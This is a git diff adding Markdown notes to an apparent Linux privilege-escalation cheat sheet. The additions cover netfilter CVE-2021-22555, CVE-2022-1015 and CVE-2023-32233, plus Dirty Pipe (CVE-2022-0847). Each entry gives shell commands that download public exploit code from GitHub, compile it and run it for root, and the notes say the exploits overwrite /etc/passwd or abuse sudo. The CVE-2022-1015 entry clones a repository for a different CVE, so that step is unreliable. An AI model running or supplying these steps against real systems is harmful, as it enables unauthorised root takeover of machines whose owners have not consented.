@@ -57,3 +57,53 @@ git clone https://github.com/arthepsy/CVE-2021-4034.git
 cd CVE-2021-4034
 gcc cve-2021-4034-poc.c -o poc
 ```
+## Netfilter
+* Linux kernel module that provides, packet filtering, network address translation, and more. 
+
+Has 3 main functions
+1. Packet defragmentation
+2. Connection Tracking
+3. NAT
+* When activated, all IP packets are checked by `netfilter`
+### CVEs
+1. [CVE-2021-22555](https://github.com/google/security-research/tree/master/pocs/linux/cve-2021-22555)
+2. [CVE-2022-1015](https://github.com/pqlx/CVE-2022-1015)
+3. [CVE-2023-32233](https://github.com/Liuk3r/CVE-2023-32233)
+
+#### CVE-2021-22555
+Kernel Version 2.6-5.11
+```shell
+wget https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
+gcc -m32 -static exploit.c -o exploit
+./exploit
+```
+#### CVE-2022-1015
+Kernel Version 5.4-5.6.10
+```shell
+git clone https://github.com/Bonfee/CVE-2022-25636.git
+cd CVE-2022-25636
+make
+./exploit
+```
+#### CVE-2023-32233
+Kernel version up to 6.3.1
+```shell
+git clone https://github.com/Liuk3r/CVE-2023-32233
+cd CVE-2023-32233
+gcc -Wall -o exploit exploit.c -lmnl -lnftnl
+./exploit
+```
+## Dirty Pipe
+**CVE-2022-0847**
+* Affects kernel versions 5.8 - 5.17
+* Android phones are affected
+```shell
+git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
+cd CVE-2022-0847-DirtyPipe-Exploits
+bash compile.sh
+```
+Exploit 1 modifies the `/etc/passwd` and allows root privileges
+Exploit 2 can execute SUID binaries with root privilges. 
+```shell
+./exploit-2 /usr/bin/sudo
+```
